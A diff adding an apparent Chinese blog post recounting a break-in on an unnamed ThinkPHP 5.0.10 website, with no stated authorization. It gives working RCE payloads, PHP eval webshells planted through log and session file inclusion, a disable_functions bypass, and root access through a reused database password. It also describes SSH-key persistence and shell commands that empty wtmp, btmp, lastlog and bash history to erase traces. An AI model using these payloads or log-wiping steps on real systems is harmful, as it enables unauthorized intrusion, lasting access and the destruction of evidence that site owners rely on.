@@ -1,0 +1,179 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.5.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.5.0" type="image/png" sizes="32x32"><meta name="google-site-verification" content="QDXQenTtxQ6MwW-M_7k9lw39Kq7F4pwFO0u1QAPYlDE"><meta name="description" content="渗透某搜索网站，从www到root的过程记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="对某搜索网站的一次Getshell">
+<meta property="og:url" content="http://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/index.html">
+<meta property="og:site_name" content="7TEN7&#39;s Blog">
+<meta property="og:description" content="渗透某搜索网站，从www到root的过程记录。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.7ten7.top/images/20200502/header.png">
+<meta property="article:published_time" content="2020-05-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-02T18:44:19.249Z">
+<meta property="article:author" content="7TEN7">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.7ten7.top/images/20200502/header.png"><title>对某搜索网站的一次Getshell | 7TEN7's Blog</title><link ref="canonical" href="http://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/"><link rel="alternate" href="/atom.xml" type="application/atom+xml"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.5.0"><script src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" data-ad-client="ca-pub-4793862971469188" async=""></script><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"simple","highlight":"ocean","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: true,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-link"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">对某搜索网站的一次Getshell</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2020-05-02</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">字数统计</span><span class="post-meta-item__value">1.7k</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">阅读时长</span><span class="post-meta-item__value">10分</span></span></div></header><div class="post-body"><div class="gallery"><img src="/images/20200502/header.png"></div>
+        <h2 id="前言"   >
+          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>
+      <p>丁师傅给了个站，说是基于 thinkphp5.0.10 的一个网站，但有 <code>disable_functions</code> 问我如何 getshell。本以为应该随手就能 getshell 了，但拿到站之后，日了很久，才最终拿到 webshell。拿到 shell 之后整理了下整个流程和思路，感觉自己真的太菜了… 过程中忽视了一些细节，导致走了一些弯路。</p>
+
+        <h2 id="过程"   >
+          <a href="#过程" class="heading-link"><i class="fas fa-link"></i></a>过程</h2>
+      <p>输入不存在的路径得到报错信息，由此可以得到目标的 ThinkPHP 版本为 5.0.10</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/001.png"  alt="">
+      </p>
+<p>5.0.10 在没有 <code>disable_functions</code> 的情况下，直接 RCE 的 payload 打过去就行了</p>
+<p>POST 提交<code>s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system</code></p>
+<p>但目标环境直接用这个payload 发现无任何反应。通过 <code>s=-1&amp;_method=__construct&amp;method=POST&amp;filter[]=phpinfo</code> 查看 phpinfo 信息，获取到了 <code>disable_functions</code> 列表</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/002.png"  alt="">
+      </p>
+<p>可以看到 <code>pcntl_exec</code> 不在 <code>disable_functions</code> 中，所以在 getshell 之后 bypass disable_functions 的话，可以尝试利用下这个函数。</p>
+
+        <h3 id="遇到问题"   >
+          <a href="#遇到问题" class="heading-link"><i class="fas fa-link"></i></a>遇到问题</h3>
+      <p>5.0.10 版本的 RCE 漏洞，由于漏洞最终的执行点如下图，只能调用单参数的函数，在<code>disable_functions</code> 禁用了命令执行函数之后，便不能直接通过调用 bash 命令来写入 webshell 了。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/003.png"  alt="">
+      </p>
+<p>因为只能执行接收一个参数的函数，<code>file_put_contents</code> 这个写文件的函数至少需要两个参数，所以到这里 getshell 的思路暂时断了。没了思路就想先把这个利用点先放着了。</p>
+<p>重新对目标进行信息收集，主要想从端口下手，看看目标有没有开这其他服务，但通过多地 ping 发现目标部署了 CDN 服务，所以 ping 得到的并不是目标的真实 IP。但问题不大，前面的 RCE 漏洞是能执行 <code>phpinfo()</code> 的，通过 <code>phpinfo()</code> 拿到目标的真实 IP</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/004.png"  alt="">
+      </p>
+<p>进行端口探测后发现，目标的 3306 可以外联，利用前面的 RCE 漏洞，读取数据库配置文件，得到了数据库用户名密码。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/005.png"  alt="">
+      </p>
+<blockquote>
+<p>这里得到的用户名不是 root，我连上数据库后没注意，看了眼数据库就溜了。但事后丁师傅告诉我这个用户跟 root 权限相同，且通过读取用户密码hash，可以破解出用户密码（无语）。这样的话，数据库这里也是一个可以利用的点（想试试数据库的利用时，发现数据库连不上了….）</p>
+</blockquote>
+<p>当时以为数据库无法利用，就放弃了数据库这里。之后又在寻找有没有函数接收一个参数，能进行 getshell 的。</p>
+<p>这时突然想到 PHP 的文件包含<del>函数</del>，只需要一个参数，但在目标上试了下，发现失败了，之后本地测试了下。得到如下报错。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/006.png"  alt="">
+      </p>
+<p>好吧， include 不是函数，是一种特殊的语言结构，不能动态调用。</p>
+
+        <h3 id="解决问题"   >
+          <a href="#解决问题" class="heading-link"><i class="fas fa-link"></i></a>解决问题</h3>
+      <p>这时，看到了先知上的一篇文章，<span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/6106"  target="_blank" rel="noopener">记一次有趣的tp5代码执行</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 。发现在 Thinkphp 的  <code>Loader.php</code>中，<code>__include_file</code> 和 <code>__require_file</code> 两个框架函数封装了 <code>include</code> 和 <code>require</code> <del>函数</del>。那么我们便可以动态调用框架中提供的这两个函数来实现文件包含。</p>
+<p>接下来要做的就是如何把我们的一句话内容写入到目标服务器上，先知文章中也提供了两个思路，写日志和写session。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写shell进日志</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;</span><br><span class="line"></span><br><span class="line">包含日志文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;runtime&#x2F;log&#x2F;201901&#x2F;21.log&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">写 shell 到 session 文件</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;&amp;server[]&#x3D;1</span><br><span class="line"></span><br><span class="line">包含 session 文件</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\__include_file&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_[sessid]&amp;server[]&#x3D;1</span><br></pre></td></tr></table></div></figure>
+<p>先在目标上尝试了下将 shell 写进日志，但是发现失败了。查看了目标关于日志的相关配置，发现原来是目标将日志功能关闭了。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images\20200502/007.png"  alt="">
+      </p>
+<p>那只能利用写 session 的方式来进行写 shell 了。想利用<code>&lt;?php file_put_contents(&#39;config.php&#39;,&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;)?&gt;</code> 在 public 目录下写入一个一句话。</p>
+<p>但是尝试了几次，都没有写入成功。此时我以为是 session 的存储路径不在 /tmp 目录下，然后用 phpinfo 查看了 session 存储路径，发现值为空。以为这个点利用不了了，又开始找其他写入文件的方法。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/009.png"  alt="">
+      </p>
+<p>但后来通过查看 /tmp 目录下的文件内容发现 session 文件是写入了的，那么为什么一句话木马生成不了呢？</p>
+<p>既然生成不了新的一句话，那就直接在 session 文件中写入一句话然后包含，果然直接成功了。之后用蚁剑连上 shell 后发现目标的网站根目录下对 www 用户根被没有写权限。所以才导致了一句话写入不了。</p>
+<p>
+        <img   class="lazyload lazyload-gif"
+          src="/images/loading.svg" data-src="/images/20200502/008.png"  alt="">
+      </p>
+
+        <h3 id="bypass-disable-functions"   >
+          <a href="#bypass-disable-functions" class="heading-link"><i class="fas fa-link"></i></a>bypass disable_functions</h3>
+      <p>黑名单函数比较少，所以这个环境的绕过还是比较容易的，利用 <code>pcntl_exec()</code> 或者直接用蚁剑插件也行。</p>
+
+        <h3 id="提权"   >
+          <a href="#提权" class="heading-link"><i class="fas fa-link"></i></a>提权</h3>
+      <p>思路很简单，主要是运气真得好…难得渗透的时候运气好一次…</p>
+<p>前文说过了，数据库 root 的用户名，可以破解出来。反弹 shell 回来之后，使用 su 命令，用数据库的 root 密码尝试了下切换到系统 root 用户，结果就成功了。</p>
+<blockquote>
+<p>反弹的 shell 要先用 Python 切换到具有交互的shell，再用 su 切换</p>
+</blockquote>
+
+        <h3 id="权限维持"   >
+          <a href="#权限维持" class="heading-link"><i class="fas fa-link"></i></a>权限维持</h3>
+      <p>权限维持接触的比少，骚思路比较少，简单的添加个 ssh 私钥登录。</p>
+<p>修改 ssh 配置文件，开启 ssh 私钥登录，然后往 <code>/root/.ssh</code> 目录下写入公钥</p>
+
+        <h3 id="痕迹清理"   >
+          <a href="#痕迹清理" class="heading-link"><i class="fas fa-link"></i></a>痕迹清理</h3>
+      <p>简单清理下 ssh，bash 等的历史记录。</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; /var/<span class="built_in">log</span>/wtmp  <span class="comment"># 对应 last 命令，所有成功登录/登出的历史记录</span></span><br><span class="line">&gt; /var/<span class="built_in">log</span>/btmp  <span class="comment"># 对应 lastb 命令，登录失败尝试</span></span><br><span class="line">&gt; /var/<span class="built_in">log</span>/lastlog  <span class="comment"># 对应 lastlog 命令，最近登录记录</span></span><br><span class="line">&gt; /root/.viminfo <span class="comment"># vim 的记录</span></span><br><span class="line">&gt; /root/.bash_history <span class="comment"># 这样会清空 .bash_history 文件的内容，建议使用 history -c 来将历史记录还原到登录之前</span></span><br></pre></td></tr></table></div></figure>
+
+        <h2 id="总结"   >
+          <a href="#总结" class="heading-link"><i class="fas fa-link"></i></a>总结</h2>
+      <p>这次思路整理起来感觉没有什么特别困难的地方，但实际在做的时候还是遇到了不少问题的。总结起来还是自己对搜集到的信息忽视了太多细节，导致走了很多弯路。渗透测试就是信息搜集还是没错的。</p>
+
+        <h2 id="参考"   >
+          <a href="#参考" class="heading-link"><i class="fas fa-link"></i></a>参考</h2>
+      <p><span class="exturl"><a class="exturl__link"   href="https://xz.aliyun.com/t/6106"  target="_blank" rel="noopener">记一次有趣的tp5代码执行</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://www.7ten7.top">7TEN7</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/">http://www.7ten7.top/2020/05/02/2020-05-02-%E5%AF%B9%E6%9F%90%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E7%9A%84%E4%B8%80%E6%AC%A1Getshell/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://www.7ten7.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2020/06/15/2020-06-15-%E6%89%93%E5%8D%B0%E6%9C%BA%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">针对打印机的一些渗透思路总结</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2020/04/27/2020-04-27-PHP%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AF%BC%E8%87%B4%E5%BC%95%E5%8F%B7%E9%80%83%E9%80%B8/"><span class="paginator-prev__text">PHP格式化字符串导致引号逃逸</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-number">2.</span> <span class="toc-text">
+          过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#遇到问题"><span class="toc-number">2.1.</span> <span class="toc-text">
+          遇到问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决问题"><span class="toc-number">2.2.</span> <span class="toc-text">
+          解决问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-disable-functions"><span class="toc-number">2.3.</span> <span class="toc-text">
+          bypass disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#提权"><span class="toc-number">2.4.</span> <span class="toc-text">
+          提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#权限维持"><span class="toc-number">2.5.</span> <span class="toc-text">
+          权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#痕迹清理"><span class="toc-number">2.6.</span> <span class="toc-text">
+          痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">
+          总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">
+          参考</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/author/author.png" alt="avatar"></div><p class="sidebar-ov-author__text">7TEN7</p></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-rss"><a class="sidebar-ov-feed-rss__link" href="/atom.xml" target="_blank" rel="noopener"><span class="sidebar-ov-feed-rss__icon"><i class="fas fa-rss"></i></span><span>RSS 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">55</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">32</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__devider"></span><span>7TEN7</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,255,255" opacity="1" count="200" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/npm/lazyload@2.0.0-rc.2/lazyload.min.js"></script><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script>function loadValine () {
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var guest_info = 'nick,mail,link';
+
+  guest_info = guest_info.split(',').filter(function(item) {
+    return GUEST_INFO.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#valine-container',
+    appId: 'Nzl7LsK4moQuOsIfeWfbc8Rz-gzGzoHsz',
+    appKey: '5xmoJuWrMWHpI7pwtJviyIh6',
+    notify: true,
+    verify: true,
+    placeholder: 'Just go go',
+    avatar: 'mp',
+    meta: guest_info,
+    pageSize: '10' || 10,
+    visitor: false,
+    recordIP: true,
+    lang: '' || 'zh-cn',
+    path: window.location.pathname
+  });
+}
+
+if (false) {
+  loadValine();
+} else {
+  window.addEventListener('DOMContentLoaded', loadValine, false);
+}</script><script src="/js/utils.js?v=2.5.0"></script><script src="/js/stun-boot.js?v=2.5.0"></script><script src="/js/scroll.js?v=2.5.0"></script><script src="/js/header.js?v=2.5.0"></script><script src="/js/sidebar.js?v=2.5.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/shizuku.model.json"},"display":{"position":"right","width":260,"height":380,"vOffset":5},"mobile":{"show":true},"log":false});</script></body></html>
